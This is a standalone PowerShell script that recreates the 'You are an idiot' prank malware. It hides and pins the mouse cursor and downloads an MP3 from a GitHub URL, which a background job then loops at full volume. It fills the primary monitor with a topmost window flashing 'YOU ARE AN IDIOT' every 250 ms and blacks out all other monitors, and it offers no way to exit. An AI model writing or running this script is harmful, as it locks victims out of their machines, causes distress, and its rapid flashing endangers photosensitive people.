Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName presentationCore

# Win32: Hide cursor
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class NativeMethods {
    [DllImport("user32.dll")]
    public static extern int ShowCursor(bool bShow);
}
"@
while ([NativeMethods]::ShowCursor($false) -ge 0) {}

# === Download MP3
$mp3Url = "https://raw.githubusercontent.com/coolman6969-ui/turtle-rap/main/You%20are%20an%20idiot%20HAHAHAHAHA!.mp3"
$mp3Path = "$env:TEMP\idiot_audio.mp3"
if (-not (Test-Path $mp3Path)) {
    Invoke-WebRequest -Uri $mp3Url -OutFile $mp3Path -UseBasicParsing
}

# === Start audio loop (11s + 0.5s delay)
Start-Job {
    Add-Type -AssemblyName presentationCore
    $player = New-Object System.Windows.Media.MediaPlayer
    $uri = [Uri]::new("$env:TEMP\idiot_audio.mp3")
    $player.Open($uri)
    $player.Volume = 1.0

    # Wait until media is ready
    do { Start-Sleep -Milliseconds 100 } while (-not $player.NaturalDuration.HasTimeSpan)

    while ($true) {
        $player.Position = [TimeSpan]::Zero
        $player.Play()
        Start-Sleep -Seconds 11
        $player.Stop()
        Start-Sleep -Milliseconds 500
    }
} | Out-Null

# === Show form(s)
[System.Windows.Forms.Application]::EnableVisualStyles()
$primary = [System.Windows.Forms.Screen]::AllScreens | Where-Object { $_.Primary }
$others  = [System.Windows.Forms.Screen]::AllScreens | Where-Object { -not $_.Primary }

# === Primary Monitor: Flashing text
$form = New-Object Windows.Forms.Form
$form.StartPosition = 'Manual'
$form.Location = $primary.Bounds.Location
$form.Size = $primary.Bounds.Size
$form.FormBorderStyle = 'None'
$form.TopMost = $true
$form.BackColor = 'Black'
$form.ShowInTaskbar = $false
$form.Cursor = [System.Windows.Forms.Cursors]::None

$label = New-Object Windows.Forms.Label
$label.Text = "YOU ARE AN IDIOT"
$label.Font = New-Object Drawing.Font("Arial", 72, [Drawing.FontStyle]::Bold)
$label.AutoSize = $true
$label.ForeColor = 'White'
$label.BackColor = 'Black'
$form.Controls.Add($label)

$form.Add_Shown({
    $label.Left = ($form.ClientSize.Width - $label.Width) / 2
    $label.Top = ($form.ClientSize.Height - $label.Height) / 2
})
$form.Add_Resize({
    $label.Left = ($form.ClientSize.Width - $label.Width) / 2
    $label.Top = ($form.ClientSize.Height - $label.Height) / 2
})

$timer = New-Object Windows.Forms.Timer
$timer.Interval = 250
$timer.Add_Tick({
    if ($form.BackColor -eq 'Black') {
        $form.BackColor = 'White'
        $label.ForeColor = 'Black'
        $label.BackColor = 'White'
    } else {
        $form.BackColor = 'Black'
        $label.ForeColor = 'White'
        $label.BackColor = 'Black'
    }
    [System.Windows.Forms.Cursor]::Position = [System.Drawing.Point]::new(0,0)
})
$timer.Start()
$form.Show()

# === Secondary Monitors: Just black screens
foreach ($screen in $others) {
    $blackForm = New-Object Windows.Forms.Form
    $blackForm.StartPosition = 'Manual'
    $blackForm.Location = $screen.Bounds.Location
    $blackForm.Size = $screen.Bounds.Size
    $blackForm.FormBorderStyle = 'None'
    $blackForm.TopMost = $true
    $blackForm.BackColor = 'Black'
    $blackForm.ShowInTaskbar = $false
    $blackForm.Cursor = [System.Windows.Forms.Cursors]::None
    $blackForm.Show()
}

# === Run all forms
[System.Windows.Forms.Application]::Run()
